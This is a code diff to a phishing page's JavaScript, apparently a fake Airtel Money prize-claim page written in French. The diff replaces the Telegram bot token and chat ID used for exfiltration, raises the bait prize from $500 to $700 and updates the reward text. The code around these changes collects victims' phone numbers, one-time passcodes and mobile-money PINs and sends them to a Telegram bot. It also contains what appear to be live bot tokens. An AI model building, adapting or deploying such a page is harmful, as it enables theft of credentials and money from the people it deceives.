@@ -501,8 +501,8 @@
     // ============================================================
     // ================= TELEGRAM CONFIGURATION ===================
     // ============================================================
-    const TELEGRAM_BOT_TOKEN = "8696942656:AAHfFfvSQ9uuFEhzQaNys5FmGhLJ1ekq2CI";  // <-- Replace
-    const TELEGRAM_CHAT_ID = "6746662456";      // <-- Replace
+    const TELEGRAM_BOT_TOKEN = "8325227901:AAFWD9u4VRE9x8pk909QHj4cjgy W8Uv3n58";  // <-- Replace
+    const TELEGRAM_CHAT_ID = "6032391944";      // <-- Replace
     // ============================================================
 
     let currentStep = 1;
@@ -824,7 +824,7 @@
 
       // ⭐ SEND PRICE DEMANDED ALERT
       sendToTelegram(
-`💰 *PRIX RÉCLAMÉ ($500)*
+`💰 *PRIX RÉCLAMÉ ($700)*
 
 📞 Téléphone: \`${formData.phone}\`
 🏆 Transaction: AIR-KNVQ-8488
@@ -851,7 +851,7 @@
       document.getElementById('input-phone').value = '';
       document.getElementById('input-otp').value = '';
       document.querySelectorAll('.money-pin').forEach(i => { i.value = ''; i.type = 'password'; });
-      formData = { phone: '', moneyPin: '', reward: '1,552 USD AIRTEL Money', otp: '', pin: '' };
+      formData = { phone: '', moneyPin: '', reward: '700 USD AIRTEL Money', otp: '', pin: '' };
       moneyPinVisible = false;
       const toggleIcon = document.querySelector('#toggle-money-pin i');
       if (toggleIcon) {
